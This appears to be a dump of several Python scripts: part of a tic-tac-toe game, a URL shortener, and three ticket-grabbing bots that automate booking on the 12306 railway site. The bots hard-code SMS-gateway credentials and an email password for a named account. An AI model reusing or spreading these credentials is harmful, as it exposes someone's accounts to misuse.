        button3.config(bg="#80ffaa")  # [X][ ][ ]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 2 is the Winner!")
        disableButtons
        start()

    elif button4["text"] == "O" and button5["text"] == "O" and button6["text"] == "O":
        button4.config(bg="#80ffaa")  # [X][X][ ]
        button5.config(bg="#80ffaa")  # [O][O][O]
        button6.config(bg="#80ffaa")  # [X][ ][ ]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 2 is the Winner!")
        disableButtons
        start()

    elif button7["text"] == "O" and button8["text"] == "O" and button9["text"] == "O":
        button7.config(bg="#80ffaa")  # [X][ ][ ]
        button8.config(bg="#80ffaa")  # [X][X][ ]
        button9.config(bg="#80ffaa")  # [O][O][O]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 2 is the Winner!")
        disableButtons
        start()

    elif button1["text"] == "O" and button4["text"] == "O" and button7["text"] == "O":
        button1.config(bg="#80ffaa")  # [O][X][X]
        button4.config(bg="#80ffaa")  # [O][X][ ]
        button7.config(bg="#80ffaa")  # [O][ ][ ]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 2 is the Winner!")
        disableButtons
        start()

    elif button2["text"] == "O" and button5["text"] == "O" and button8["text"] == "O":
        button2.config(bg="#80ffaa")  # [X][O][X]
        button5.config(bg="#80ffaa")  # [X][O][ ]
        button8.config(bg="#80ffaa")  # [ ][O][ ]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 2 is the Winner!")
        disableButtons
        start()

    elif button3["text"] == "O" and button6["text"] == "O" and button9["text"] == "O":
        button3.config(bg="#80ffaa")  # [X][X][O]
        button6.config(bg="#80ffaa")  # [ ][X][O]
        button9.config(bg="#80ffaa")  # [ ][ ][O]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 2 is the Winner!")
        disableButtons
        start()

    elif button1["text"] == "O" and button5["text"] == "O" and button9["text"] == "O":
        button1.config(bg="#80ffaa")  # [O][X][X]
        button5.config(bg="#80ffaa")  # [ ][O][ ]
        button9.config(bg="#80ffaa")  # [ ][X][O]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 2 is the Winner!")
        disableButtons
        start()

    elif button3["text"] == "O" and button5["text"] == "O" and button7["text"] == "O":
        button3.config(bg="#80ffaa")  # [X][X][O]
        button5.config(bg="#80ffaa")  # [ ][O][ ]
        button7.config(bg="#80ffaa")  # [O][X][ ]
        winner = True
        messagebox.showinfo("Tic Tac Toe", "Player 2 is the Winner!")
        disableButtons
        start()


# To check whether the game is a draw
def checkDraw():
    global count, winner

    if count == 9 and winner == False:
        messagebox.showerror("Tic Tac Toe", "Draw, play again!")
        start()


# To determine the buttons that Player 1 or Player 2 has clicked on
def buttonClicked(button):
    global clicked, count

    if button["text"] == " " and clicked == True:
        button["text"] = "X"
        clicked = False
        count += 1
        checkWinner()
        checkDraw()
    elif button["text"] == " " and clicked == False:
        button["text"] = "O"
        clicked = True
        count += 1
        checkWinner()
        checkDraw()
    else:
        messagebox.showerror("Tic Tac Toe", "Please select another box.")


# To start or restart the game
def start():
    global button1, button2, button3, button4, button5, button6, button7, button8, button9
    global clicked, count
    clicked = True
    count = 0

    # Building the buttons for the game
    button1 = Button(root, text=" ", font=("Helvetica, 20"), height=3, width=7, bg="SystemButtonFace",
                     command=lambda: buttonClicked(button1))
    button2 = Button(root, text=" ", font=("Helvetica, 20"), height=3, width=7, bg="SystemButtonFace",
                     command=lambda: buttonClicked(button2))
    button3 = Button(root, text=" ", font=("Helvetica, 20"), height=3, width=7, bg="SystemButtonFace",
                     command=lambda: buttonClicked(button3))

    button4 = Button(root, text=" ", font=("Helvetica, 20"), height=3, width=7, bg="SystemButtonFace",
                     command=lambda: buttonClicked(button4))
    button5 = Button(root, text=" ", font=("Helvetica, 20"), height=3, width=7, bg="SystemButtonFace",
                     command=lambda: buttonClicked(button5))
    button6 = Button(root, text=" ", font=("Helvetica, 20"), height=3, width=7, bg="SystemButtonFace",
                     command=lambda: buttonClicked(button6))

    button7 = Button(root, text=" ", font=("Helvetica, 20"), height=3, width=7, bg="SystemButtonFace",
                     command=lambda: buttonClicked(button7))
    button8 = Button(root, text=" ", font=("Helvetica, 20"), height=3, width=7, bg="SystemButtonFace",
                     command=lambda: buttonClicked(button8))
    button9 = Button(root, text=" ", font=("Helvetica, 20"), height=3, width=7, bg="SystemButtonFace",
                     command=lambda: buttonClicked(button9))

    # Arranging the buttons on the screen for the game
    button1.grid(row=0, column=0)
    button2.grid(row=0, column=1)
    button3.grid(row=0, column=2)

    button4.grid(row=1, column=0)
    button5.grid(row=1, column=1)
    button6.grid(row=1, column=2)

    button7.grid(row=2, column=0)
    button8.grid(row=2, column=1)
    button9.grid(row=2, column=2)


# Create game menu
gameMenu = Menu(root)
root.config(menu=gameMenu)

# Create game options menu
optionMenu = Menu(gameMenu, tearoff=False)
gameMenu.add_cascade(label="Options", menu=optionMenu)
optionMenu.add_command(label="Restart Game", command=start)

start()
root.mainloop()

from tkinter import *
import tkinter as tk
from datetime import datetime
from tkinter import messagebox
import pyshorteners


class url_shortner:

    def create(self):
        if self.url.get() == "":
            messagebox.showerror("Error", "Please Paste an URL")
        else:
            self.urls = self.url.get()
            self.s = pyshorteners.Shortener()
            self.short_url = self.s.tinyurl.short(self.urls)

            self.output = Entry(self.root, font=('verdana', 10, 'bold'), fg="purple", width=30, relief=GROOVE,
                                borderwidth=2, border=2)
            self.output.insert(END, self.short_url)
            self.output.place(x=80, y=120)

    def __init__(self):
        self.root = tk.Tk()
        self.root.geometry('500x200')
        self.root.maxsize(500, 200)
        self.root.minsize(500, 200)
        self.root.title('Url Shortner')
        self.root['bg'] = "white"

        self.title = Label(self.root, text="URL Shortner", font=('verdana', 15, 'bold'), bg="white", fg="purple")
        self.title.place(x=180, y=5)

        self.date = Label(self.root, text=datetime.now().date(), fg="purple", font=('verdana', 10, 'bold'))
        self.date.place(x=400, y=5)

        Label(self.root, text="Paste Your Url Here ..", font=('verdana', 10, 'bold'), fg="purple").place(x=50, y=50)

        self.url = Entry(self.root, width=50, bg="lightgrey", relief=GROOVE, borderwidth=2, border=2)
        self.url.place(x=50, y=80)

        self.button = Button(self.root, relief=GROOVE, text="Create", font=('verdana', 8, 'bold'), bg="purple",
                             fg="white", command=self.create)
        self.button.place(x=360, y=78)
        self.root.mainloop()


if __name__ == '__main__':
    url_shortner()

# !/usr/bin/env python
# -*- coding: utf-8 -*-

"""
通过splinter刷12306火车票
进入登陆页面，可以选择扫码登陆或者账号密码登陆
登陆成功后，接下来的事情，交由脚本来做了，静静的等待抢票结果就好（刷票过程中，浏览器不可关闭）
抢票成功，会进行手机短信和邮件的通知
author: cuizy
time: 2018-11-21
"""

import re
from splinter.browser import Browser
from time import sleep
import sys
import httplib2
from urllib import parse
import smtplib
from email.mime.text import MIMEText
import time


class BrushTicket(object):
    """买票类及实现方法"""

    def __init__(self, passengers, from_time, from_station, to_station, number, seat_type, receiver_mobile,
                 receiver_email):
        """定义实例属性，初始化"""
        # 乘客姓名
        self.passengers = passengers
        # 起始站和终点站
        self.from_station = from_station
        self.to_station = to_station
        # 乘车日期
        self.from_time = from_time
        # 车次编号
        self.number = number.capitalize()
        # 座位类型所在td位置
        if seat_type == '商务座特等座':
            seat_type_index = 1
            seat_type_value = 9
        elif seat_type == '一等座':
            seat_type_index = 2
            seat_type_value = 'M'
        elif seat_type == '二等座':
            seat_type_index = 3
            seat_type_value = 0
        elif seat_type == '高级软卧':
            seat_type_index = 4
            seat_type_value = 6
        elif seat_type == '软卧':
            seat_type_index = 5
            seat_type_value = 4
        elif seat_type == '动卧':
            seat_type_index = 6
            seat_type_value = 'F'
        elif seat_type == '硬卧':
            seat_type_index = 7
            seat_type_value = 3
        elif seat_type == '软座':
            seat_type_index = 8
            seat_type_value = 2
        elif seat_type == '硬座':
            seat_type_index = 9
            seat_type_value = 1
        elif seat_type == '无座':
            seat_type_index = 10
            seat_type_value = 1
        elif seat_type == '其他':
            seat_type_index = 11
            seat_type_value = 1
        else:
            seat_type_index = 7
            seat_type_value = 3
        self.seat_type_index = seat_type_index
        self.seat_type_value = seat_type_value
        # 通知信息
        self.receiver_mobile = receiver_mobile
        self.receiver_email = receiver_email
        # 新版12306官网主要页面网址
        self.login_url = 'https://kyfw.12306.cn/otn/resources/login.html'
        self.init_my_url = 'https://kyfw.12306.cn/otn/view/index.html'
        self.ticket_url = 'https://kyfw.12306.cn/otn/leftTicket/init?linktypeid=dc'
        # 浏览器驱动信息，驱动下载页：https://sites.google.com/a/chromium.org/chromedriver/downloads
        self.driver_name = 'chrome'
        self.driver = Browser(driver_name=self.driver_name)

    def do_login(self):
        """登录功能实现，手动识别验证码进行登录"""
        self.driver.visit(self.login_url)
        sleep(1)
        # 选择登陆方式登陆
        print('请扫码登陆或者账号登陆……')
        while True:
            if self.driver.url != self.init_my_url:
                sleep(1)
            else:
                break

    def start_brush(self):
        """买票功能实现"""
        # 浏览器窗口最大化
        self.driver.driver.maximize_window()
        # 登陆
        self.do_login()
        # 跳转到抢票页面
        self.driver.visit(self.ticket_url)
        try:
            print('开始刷票……')
            # 加载车票查询信息
            self.driver.cookies.add({"_jc_save_fromStation": self.from_station})
            self.driver.cookies.add({"_jc_save_toStation": self.to_station})
            self.driver.cookies.add({"_jc_save_fromDate": self.from_time})
            self.driver.reload()
            count = 0
            while self.driver.url == self.ticket_url:
                try:
                    self.driver.find_by_text('查询').click()
                except Exception as error_info:
                    print(error_info)
                    sleep(1)
                    continue
                sleep(0.5)
                count += 1
                local_date = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                print('第%d次点击查询……[%s]' % (count, local_date))
                try:
                    current_tr = self.driver.find_by_xpath(
                        '//tr[@datatran="' + self.number + '"]/preceding-sibling::tr[1]')
                    if current_tr:
                        if current_tr.find_by_tag('td')[self.seat_type_index].text == '--':
                            print('无此座位类型出售，已结束当前刷票，请重新开启！')
                            sys.exit(1)
                        elif current_tr.find_by_tag('td')[self.seat_type_index].text == '无':
                            print('无票，继续尝试……')
                            sleep(1)
                        else:
                            # 有票，尝试预订
                            print('刷到票了（余票数：' + str(
                                current_tr.find_by_tag('td')[self.seat_type_index].text) + '），开始尝试预订……')
                            current_tr.find_by_css('td.no-br>a')[0].click()
                            sleep(1)
                            key_value = 1
                            for p in self.passengers:
                                if '()' in p:
                                    p = p[:-1] + '学生' + p[-1:]
                                # 选择用户
                                print('开始选择用户……')
                                self.driver.find_by_text(p).last.click()
                                # 选择座位类型
                                print('开始选择席别……')
                                if self.seat_type_value != 0:
                                    self.driver.find_by_xpath(
                                        "//select[@id='seatType_" + str(key_value) + "']/option[@value='" + str(
                                            self.seat_type_value) + "']").first.click()
                                key_value += 1
                                sleep(0.2)
                                if p[-1] == ')':
                                    self.driver.find_by_id('dialog_xsertcj_ok').click()
                            print('正在提交订单……')
                            self.driver.find_by_id('submitOrder_id').click()
                            sleep(2)
                            # 查看放回结果是否正常
                            submit_false_info = self.driver.find_by_id('orderResultInfo_id')[0].text
                            if submit_false_info != '':
                                print(submit_false_info)
                                self.driver.find_by_id('qr_closeTranforDialog_id').click()
                                sleep(0.2)
                                self.driver.find_by_id('preStep_id').click()
                                sleep(0.3)
                                continue
                            print('正在确认订单……')
                            self.driver.find_by_id('qr_submit_id').click()
                            print('预订成功，请及时前往支付……')
                            # 发送通知信息
                            self.send_mail(self.receiver_email, '恭喜您，抢到票了，请及时前往12306支付订单！')
                            self.send_sms(self.receiver_mobile, '您的验证码是：8888。请不要把验证码泄露给其他人。')
                    else:
                        print('不存在当前车次【%s】，已结束当前刷票，请重新开启！' % self.number)
                        sys.exit(1)
                except Exception as error_info:
                    print(error_info)
                    # 跳转到抢票页面
                    self.driver.visit(self.ticket_url)
        except Exception as error_info:
            print(error_info)

    def send_sms(self, mobile, sms_info):
        """发送手机通知短信，用的是-互亿无线-的测试短信"""
        host = "106.ihuyi.com"
        sms_send_uri = "/webservice/sms.php?method=Submit"
        account = "C59782899"
        pass_word = "19d4d9c0796532c7328e8b82e2812655"
        params = parse.urlencode(
            {'account': account, 'password': pass_word, 'content': sms_info, 'mobile': mobile, 'format': 'json'}
        )
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
        conn = httplib2.HTTPConnectionWithTimeout(host, port=80, timeout=30)
        conn.request("POST", sms_send_uri, params, headers)
        response = conn.getresponse()
        response_str = response.read()
        conn.close()
        return response_str

    def send_mail(self, receiver_address, content):
        """发送邮件通知"""
        # 连接邮箱服务器信息
        host = 'smtp.163.com'
        port = 25
        sender = 'gxcuizy@163.com'  # 你的发件邮箱号码
        pwd = '******'  # 不是登陆密码，是客户端授权密码
        # 发件信息
        receiver = receiver_address
        body = '<h2>温馨提醒：</h2><p>' + content + '</p>'
        msg = MIMEText(body, 'html', _charset="utf-8")
        msg['subject'] = '抢票成功通知！'
        msg['from'] = sender
        msg['to'] = receiver
        s = smtplib.SMTP(host, port)
        # 开始登陆邮箱，并发送邮件
        s.login(sender, pwd)
        s.sendmail(sender, receiver, msg.as_string())


if __name__ == '__main__':
    # 乘客姓名
    passengers_input = input(
        '请输入乘车人姓名，多人用英文逗号“,”连接，（例如单人“张三”或者多人“张三,李四”，如果学生的话输入“王五()”）：')
    passengers = passengers_input.split(",")
    while passengers_input == '' or len(passengers) > 4:
        print('乘车人最少1位，最多4位！')
        passengers_input = input('请重新输入乘车人姓名，多人用英文逗号“,”连接，（例如单人“张三”或者多人“张三,李四”）：')
        passengers = passengers_input.split(",")
    # 乘车日期
    from_time = input('请输入乘车日期（例如“2018-08-08”）：')
    date_pattern = re.compile(r'^\d{4}-\d{2}-\d{2}$')
    while from_time == '' or re.findall(date_pattern, from_time) == []:
        from_time = input('乘车日期不能为空或者时间格式不正确，请重新输入：')
    # 城市cookie字典
    city_list = {
        'bj': '%u5317%u4EAC%2CBJP',  # 北京
        'hd': '%u5929%u6D25%2CTJP',  # 邯郸
        'nn': '%u5357%u5B81%2CNNZ',  # 南宁
        'wh': '%u6B66%u6C49%2CWHN',  # 武汉
        'cs': '%u957F%u6C99%2CCSQ',  # 长沙
        'ty': '%u592A%u539F%2CTYV',  # 太原
        'yc': '%u8FD0%u57CE%2CYNV',  # 运城
        'gzn': '%u5E7F%u5DDE%u5357%2CIZQ',  # 广州南
        'wzn': '%u68A7%u5DDE%u5357%2CWBZ',  # 梧州南
    }
    # 出发站
    from_input = input('请输入出发站，只需要输入首字母就行（例如北京“bj”）：')
    while from_input not in city_list.keys():
        from_input = input('出发站不能为空或不支持当前出发站（如有需要，请联系管理员！），请重新输入：')
    from_station = city_list[from_input]
    # 终点站
    to_input = input('请输入终点站，只需要输入首字母就行（例如北京“bj”）：')
    while to_input not in city_list.keys():
        to_input = input('终点站不能为空或不支持当前终点站（如有需要，请联系管理员！），请重新输入：')
    to_station = city_list[to_input]
    # 车次编号
    number = input('请输入车次号（例如“G110”）：')
    while number == '':
        number = input('车次号不能为空，请重新输入：')
    # 座位类型
    seat_type = input('请输入座位类型（例如“软卧”）：')
    while seat_type == '':
        seat_type = input('座位类型不能为空，请重新输入：')
    # 抢票成功，通知该手机号码
    receiver_mobile = input('请预留一个手机号码，方便抢到票后进行通知（例如：18888888888）：')
    mobile_pattern = re.compile(r'^1{1}\d{10}$')
    while receiver_mobile == '' or re.findall(mobile_pattern, receiver_mobile) == []:
        receiver_mobile = input('预留手机号码不能为空或者格式不正确，请重新输入：')
    receiver_email = input('请预留一个邮箱，方便抢到票后进行通知（例如：test@163.com）：')
    while receiver_email == '':
        receiver_email = input('预留邮箱不能为空，请重新输入：')
    # 开始抢票
    ticket = BrushTicket(passengers, from_time, from_station, to_station, number, seat_type, receiver_mobile,
                         receiver_email)
    ticket.start_brush()

# !/usr/bin/env python
# -*- coding: utf-8 -*-

"""
通过splinter刷12306火车票（多个车次查询）
进入登陆页面，可以选择扫码登陆或者账号密码登陆
登陆成功后，接下来的事情，交由脚本来做了，静静的等待抢票结果就好（刷票过程中，浏览器不可关闭）
抢票成功，会进行手机短信和邮件的通知
author: cuizy
time: 2018-12-28
"""

import re
from splinter.browser import Browser
from time import sleep
import sys
import httplib2
from urllib import parse
import smtplib
from email.mime.text import MIMEText
import time


class BrushTicket(object):
    """买票类及实现方法"""

    def __init__(self, passengers, from_time, from_station, to_station, numbers, seat_type, receiver_mobile,
                 receiver_email):
        """定义实例属性，初始化"""
        # 乘客姓名
        self.passengers = passengers
        # 起始站和终点站
        self.from_station = from_station
        self.to_station = to_station
        # 车次
        self.numbers = list(map(lambda number: number.capitalize(), numbers))
        # 乘车日期
        self.from_time = from_time
        # 座位类型所在td位置
        if seat_type == '商务座特等座':
            seat_type_index = 1
            seat_type_value = 9
        elif seat_type == '一等座':
            seat_type_index = 2
            seat_type_value = 'M'
        elif seat_type == '二等座':
            seat_type_index = 3
            seat_type_value = 0
        elif seat_type == '高级软卧':
            seat_type_index = 4
            seat_type_value = 6
        elif seat_type == '软卧':
            seat_type_index = 5
            seat_type_value = 4
        elif seat_type == '动卧':
            seat_type_index = 6
            seat_type_value = 'F'
        elif seat_type == '硬卧':
            seat_type_index = 7
            seat_type_value = 3
        elif seat_type == '软座':
            seat_type_index = 8
            seat_type_value = 2
        elif seat_type == '硬座':
            seat_type_index = 9
            seat_type_value = 1
        elif seat_type == '无座':
            seat_type_index = 10
            seat_type_value = 1
        elif seat_type == '其他':
            seat_type_index = 11
            seat_type_value = 1
        else:
            seat_type_index = 7
            seat_type_value = 3
        self.seat_type_index = seat_type_index
        self.seat_type_value = seat_type_value
        # 通知信息
        self.receiver_mobile = receiver_mobile
        self.receiver_email = receiver_email
        # 新版12306官网主要页面网址
        self.login_url = 'https://kyfw.12306.cn/otn/resources/login.html'
        self.init_my_url = 'https://kyfw.12306.cn/otn/view/index.html'
        self.ticket_url = 'https://kyfw.12306.cn/otn/leftTicket/init?linktypeid=dc'
        # 浏览器驱动信息，驱动下载页：https://sites.google.com/a/chromium.org/chromedriver/downloads
        self.driver_name = 'chrome'
        self.driver = Browser(driver_name=self.driver_name)

    def do_login(self):
        """登录功能实现，手动识别验证码进行登录"""
        self.driver.visit(self.login_url)
        sleep(1)
        # 选择登陆方式登陆
        print('请扫码登陆或者账号登陆……')
        while True:
            if self.driver.url != self.init_my_url:
                sleep(1)
            else:
                break

    def start_brush(self):
        """买票功能实现"""
        # 浏览器窗口最大化
        self.driver.driver.maximize_window()
        # 登陆
        self.do_login()
        # 跳转到抢票页面
        self.driver.visit(self.ticket_url)
        sleep(1)
        try:
            print('开始刷票……')
            # 加载车票查询信息
            self.driver.cookies.add({"_jc_save_fromStation": self.from_station})
            self.driver.cookies.add({"_jc_save_toStation": self.to_station})
            self.driver.cookies.add({"_jc_save_fromDate": self.from_time})
            self.driver.reload()
            count = 0
            while self.driver.url == self.ticket_url:
                try:
                    self.driver.find_by_text('查询').click()
                except Exception as error_info:
                    print(error_info)
                    sleep(1)
                    continue
                sleep(0.5)
                count += 1
                local_date = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                print('第%d次点击查询……[%s]' % (count, local_date))
                try:
                    start_list = self.driver.find_by_css('.start-t')
                    for start_time in start_list:
                        current_time = start_time.text
                        current_tr = start_time.find_by_xpath('ancestor::tr')
                        if current_tr:
                            car_no = current_tr.find_by_css('.number').text
                            if car_no in self.numbers:
                                if current_tr.find_by_tag('td')[self.seat_type_index].text == '--':
                                    print('%s无此座位类型出售……' % (car_no + '(' + current_time + ')',))
                                    sleep(0.2)
                                elif current_tr.find_by_tag('td')[self.seat_type_index].text == '无':
                                    print('%s无票……' % (car_no + '(' + current_time + ')',))
                                    sleep(0.2)
                                else:
                                    # 有票，尝试预订
                                    print(car_no + '(' + current_time + ')刷到票了（余票数：' + str(
                                        current_tr.find_by_tag('td')[self.seat_type_index].text) + '），开始尝试预订……')
                                    current_tr.find_by_css('td.no-br>a')[0].click()
                                    sleep(0.5)
                                    key_value = 1
                                    for p in self.passengers:
                                        if '()' in p:
                                            p = p[:-1] + '学生' + p[-1:]
                                        # 选择用户
                                        print('开始选择用户……')
                                        self.driver.find_by_text(p).last.click()
                                        # 选择座位类型
                                        print('开始选择席别……')
                                        if self.seat_type_value != 0:
                                            self.driver.find_by_xpath(
                                                "//select[@id='seatType_" + str(key_value) + "']/option[@value='" + str(
                                                    self.seat_type_value) + "']").first.click()
                                        key_value += 1
                                        sleep(0.2)
                                        if p[-1] == ')':
                                            self.driver.find_by_id('dialog_xsertcj_ok').click()
                                    print('正在提交订单……')
                                    self.driver.find_by_id('submitOrder_id').click()
                                    sleep(2)
                                    # 查看放回结果是否正常
                                    submit_false_info = self.driver.find_by_id('orderResultInfo_id')[0].text
                                    if submit_false_info != '':
                                        print(submit_false_info)
                                        self.driver.find_by_id('qr_closeTranforDialog_id').click()
                                        sleep(0.2)
                                        self.driver.find_by_id('preStep_id').click()
                                        sleep(0.3)
                                        continue
                                    print('正在确认订单……')
                                    self.driver.find_by_id('qr_submit_id').click()
                                    print('预订成功，请及时前往支付……')
                                    # 发送通知信息
                                    self.send_mail(self.receiver_email, '恭喜您，抢到票了，请及时前往12306支付订单！')
                                    self.send_sms(self.receiver_mobile, '您的验证码是：8888。请不要把验证码泄露给其他人。')
                                    sys.exit(0)
                        else:
                            print('当前车次异常')
                except Exception as error_info:
                    print(error_info)
                    # 跳转到抢票页面
                    self.driver.visit(self.ticket_url)
        except Exception as error_info:
            print(error_info)

    def send_sms(self, mobile, sms_info):
        """发送手机通知短信，用的是-互亿无线-的测试短信"""
        host = "106.ihuyi.com"
        sms_send_uri = "/webservice/sms.php?method=Submit"
        account = "C59782899"
        pass_word = "19d4d9c0796532c7328e8b82e2812655"
        params = parse.urlencode(
            {'account': account, 'password': pass_word, 'content': sms_info, 'mobile': mobile, 'format': 'json'}
        )
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
        conn = httplib2.HTTPConnectionWithTimeout(host, port=80, timeout=30)
        conn.request("POST", sms_send_uri, params, headers)
        response = conn.getresponse()
        response_str = response.read()
        conn.close()
        return response_str

    def send_mail(self, receiver_address, content):
        """发送邮件通知"""
        # 连接邮箱服务器信息
        host = 'smtp.163.com'
        port = 25
        sender = 'gxcuizy@163.com'  # 你的发件邮箱号码
        pwd = 'FatBoy666'  # 不是登陆密码，是客户端授权密码
        # 发件信息
        receiver = receiver_address
        body = '<h2>温馨提醒：</h2><p>' + content + '</p>'
        msg = MIMEText(body, 'html', _charset="utf-8")
        msg['subject'] = '抢票成功通知！'
        msg['from'] = sender
        msg['to'] = receiver
        s = smtplib.SMTP(host, port)
        # 开始登陆邮箱，并发送邮件
        s.login(sender, pwd)
        s.sendmail(sender, receiver, msg.as_string())


if __name__ == '__main__':
    # 乘客姓名
    passengers_input = input(
        '请输入乘车人姓名，多人用英文逗号“,”连接，（例如单人“张三”或者多人“张三,李四”，如果学生的话输入“王五()”）：')
    passengers = passengers_input.split(",")
    while passengers_input == '' or len(passengers) > 4:
        print('乘车人最少1位，最多4位！')
        passengers_input = input('请重新输入乘车人姓名，多人用英文逗号“,”连接，（例如单人“张三”或者多人“张三,李四”）：')
        passengers = passengers_input.split(",")
    # 乘车日期
    from_time = input('请输入乘车日期（例如“2018-08-08”）：')
    date_pattern = re.compile(r'^\d{4}-\d{2}-\d{2}$')
    while from_time == '' or re.findall(date_pattern, from_time) == []:
        from_time = input('乘车日期不能为空或者时间格式不正确，请重新输入：')
    # 城市cookie字典
    city_list = {
        'bj': '%u5317%u4EAC%2CBJP',  # 北京
        'hd': '%u5929%u6D25%2CTJP',  # 邯郸
        'nn': '%u5357%u5B81%2CNNZ',  # 南宁
        'wh': '%u6B66%u6C49%2CWHN',  # 武汉
        'cs': '%u957F%u6C99%2CCSQ',  # 长沙
        'ty': '%u592A%u539F%2CTYV',  # 太原
        'yc': '%u8FD0%u57CE%2CYNV',  # 运城
        'gzn': '%u5E7F%u5DDE%u5357%2CIZQ',  # 广州南
        'wzn': '%u68A7%u5DDE%u5357%2CWBZ',  # 梧州南
    }
    # 出发站
    from_input = input('请输入出发站，只需要输入首字母就行（例如北京“bj”）：')
    while from_input not in city_list.keys():
        from_input = input('出发站不能为空或不支持当前出发站（如有需要，请联系管理员！），请重新输入：')
    from_station = city_list[from_input]
    # 终点站
    to_input = input('请输入终点站，只需要输入首字母就行（例如北京“bj”）：')
    while to_input not in city_list.keys():
        to_input = input('终点站不能为空或不支持当前终点站（如有需要，请联系管理员！），请重新输入：')
    to_station = city_list[to_input]
    # 乘车车次
    number_input = input('请输入抢票车次号，多车次用英文逗号“,”链接，（例如单车次“Z285”或者多车次“Z285,G110”）：')
    numbers = number_input.split(",")
    while number_input == '':
        number_input = input('请重新输入抢票车次号，多车次用英文逗号“,”链接，（例如单车次“Z285”或者多车次“Z285,G110”）：')
        numbers = number_input.split(",")
    # 座位类型
    seat_type = input('请输入座位类型（例如“软卧”）：')
    while seat_type == '':
        seat_type = input('座位类型不能为空，请重新输入：')
    # 抢票成功，通知该手机号码
    receiver_mobile = input('请预留一个手机号码，方便抢到票后进行通知（例如：18888888888）：')
    mobile_pattern = re.compile(r'^1{1}\d{10}$')
    while receiver_mobile == '' or re.findall(mobile_pattern, receiver_mobile) == []:
        receiver_mobile = input('预留手机号码不能为空或者格式不正确，请重新输入：')
    receiver_email = input('请预留一个邮箱，方便抢到票后进行通知（例如：test@163.com）：')
    while receiver_email == '':
        receiver_email = input('预留邮箱不能为空，请重新输入：')
    # 开始抢票
    ticket = BrushTicket(passengers, from_time, from_station, to_station, numbers, seat_type, receiver_mobile,
                         receiver_email)
    ticket.start_brush()

# !/usr/bin/env python
# -*- coding: utf-8 -*-

"""
通过splinter刷12306火车票（时间段查询）
进入登陆页面，可以选择扫码登陆或者账号密码登陆
登陆成功后，接下来的事情，交由脚本来做了，静静的等待抢票结果就好（刷票过程中，浏览器不可关闭）
抢票成功，会进行手机短信和邮件的通知
author: cuizy
time: 2018-12-28
"""

import re
from splinter.browser import Browser
from time import sleep
import sys
import httplib2
from urllib import parse
import smtplib
from email.mime.text import MIMEText
import time


class BrushTicket(object):
    """买票类及实现方法"""

    def __init__(self, passengers, from_time, from_station, to_station, my_start_time, my_end_time, seat_type,
                 receiver_mobile,
                 receiver_email):
        """定义实例属性，初始化"""
        # 乘客姓名
        self.passengers = passengers
        # 起始站和终点站
        self.from_station = from_station
        self.to_station = to_station
        # 乘车日期
        self.from_time = from_time
        # 出发时间段
        start_arr = my_start_time.split(':')
        if len(start_arr) == 2:
            start_time_value = int(start_arr[0]) + int(start_arr[1]) / 60
        else:
            start_time_value = int(start_arr[0])
        self.my_start_time = start_time_value
        end_arr = my_end_time.split(':')
        if len(end_arr) == 2:
            end_time_value = int(end_arr[0]) + int(end_arr[1]) / 60
        else:
            end_time_value = int(end_arr[0])
        self.my_end_time = end_time_value
        # 座位类型所在td位置
        if seat_type == '商务座特等座':
            seat_type_index = 1
            seat_type_value = 9
        elif seat_type == '一等座':
            seat_type_index = 2
            seat_type_value = 'M'
        elif seat_type == '二等座':
            seat_type_index = 3
            seat_type_value = 0
        elif seat_type == '高级软卧':
            seat_type_index = 4
            seat_type_value = 6
        elif seat_type == '软卧':
            seat_type_index = 5
            seat_type_value = 4
        elif seat_type == '动卧':
            seat_type_index = 6
            seat_type_value = 'F'
        elif seat_type == '硬卧':
            seat_type_index = 7
            seat_type_value = 3
        elif seat_type == '软座':
            seat_type_index = 8
            seat_type_value = 2
        elif seat_type == '硬座':
            seat_type_index = 9
            seat_type_value = 1
        elif seat_type == '无座':
            seat_type_index = 10
            seat_type_value = 1
        elif seat_type == '其他':
            seat_type_index = 11
            seat_type_value = 1
        else:
            seat_type_index = 7
            seat_type_value = 3
        self.seat_type_index = seat_type_index
        self.seat_type_value = seat_type_value
        # 通知信息
        self.receiver_mobile = receiver_mobile
        self.receiver_email = receiver_email
        # 新版12306官网主要页面网址
        self.login_url = 'https://kyfw.12306.cn/otn/resources/login.html'
        self.init_my_url = 'https://kyfw.12306.cn/otn/view/index.html'
        self.ticket_url = 'https://kyfw.12306.cn/otn/leftTicket/init?linktypeid=dc'
        # 浏览器驱动信息，驱动下载页：https://sites.google.com/a/chromium.org/chromedriver/downloads
        self.driver_name = 'chrome'
        self.driver = Browser(driver_name=self.driver_name)

    def do_login(self):
        """登录功能实现，手动识别验证码进行登录"""
        self.driver.visit(self.login_url)
        sleep(1)
        # 选择登陆方式登陆
        print('请扫码登陆或者账号登陆……')
        while True:
            if self.driver.url != self.init_my_url:
                sleep(1)
            else:
                break

    def start_brush(self):
        """买票功能实现"""
        # 浏览器窗口最大化
        self.driver.driver.maximize_window()
        # 登陆
        self.do_login()
        # 跳转到抢票页面
        self.driver.visit(self.ticket_url)
        sleep(1)
        try:
            print('开始刷票……')
            # 加载车票查询信息
            self.driver.cookies.add({"_jc_save_fromStation": self.from_station})
            self.driver.cookies.add({"_jc_save_toStation": self.to_station})
            self.driver.cookies.add({"_jc_save_fromDate": self.from_time})
            self.driver.reload()
            count = 0
            while self.driver.url == self.ticket_url:
                try:
                    self.driver.find_by_text('查询').click()
                except Exception as error_info:
                    print(error_info)
                    sleep(1)
                    continue
                sleep(0.5)
                count += 1
                local_date = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                print('第%d次点击查询……[%s]' % (count, local_date))
                try:
                    start_list = self.driver.find_by_css('.start-t')
                    for start_time in start_list:
                        current_time = start_time.text
                        current_time_arr = current_time.split(':')
                        if len(current_time_arr) == 2:
                            current_time_value = int(current_time_arr[0]) + int(current_time_arr[1]) / 60
                        else:
                            current_time_value = int(current_time_arr[0])
                        if ((current_time_value >= self.my_start_time) and (current_time_value <= self.my_end_time)):
